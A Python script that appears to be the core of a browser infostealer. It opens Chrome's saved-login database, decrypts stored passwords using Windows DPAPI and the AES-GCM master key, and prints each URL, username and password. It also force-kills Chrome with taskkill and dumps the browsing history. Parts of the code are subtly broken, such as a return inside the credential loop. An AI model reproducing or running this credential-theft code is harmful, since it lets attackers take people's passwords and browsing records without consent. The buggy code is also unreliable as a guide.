import os
import sqlite3
import win32crypt
import base64
import json
from Cryptodome.Cipher import AES


def get_chrome():
    data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
    c = sqlite3.connect(data_path)
    cursor = c.cursor()
    select_statement = 'SELECT origin_url, username_value, password_value FROM logins'
    cursor.execute(select_statement)

    login_data = cursor.fetchall()

    cred = {}

    string = ''

    for url, user_name, pwd in login_data:
        pwd = win32crypt.CryptUnprotectData(pwd)
        cred[url] = (user_name, pwd[1].decode('utf8'))
        string += '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' % (url, user_name, pwd[1].decode('utf8'))
        return string

def get_master_key():
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        # print("Probably saved password from Chrome version older than v80\n")
        # print(str(e))
        return "Chrome < 80"

def get_path():
    User_profile = os.environ.get("USERPROFILE")
    History_path = User_profile + r"\\AppData\Local\Google\Chrome\User Data\Default\History"  # Usually this is where the chrome history file is located, change it if you need to.
    return History_path

def get_browserhistory():
    try:
        os.system("taskkill /f /im chrome.exe")
    except:
        pass

    browserhistory = {}

    path = get_path()

    try:
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        SQL = """SELECT url, title, datetime((last_visit_time/1000000)-11644473600, 'unixepoch', 'localtime')
                                            AS last_visit_time FROM urls ORDER BY last_visit_time DESC"""

        query = []
        try:
            cursor.execute(SQL)
            query = cursor.fetchall()
        except sqlite3.OperationalError:

            print('Close Google Chrome Window')
        except Exception as err:
            print(err)
        cursor.close()
        conn.close()
        browserhistory['chrome'] = query
    except sqlite3.OperationalError:
        print('Chrome Database Permission Denied.')

    list_of_history = []

    for browser, history in browserhistory.items():
        for data in history:
            list_of_history.append(str(data[0]).decode('ascii'))

    string_of_history = "\n\n".join(list_of_history)

    return string_of_history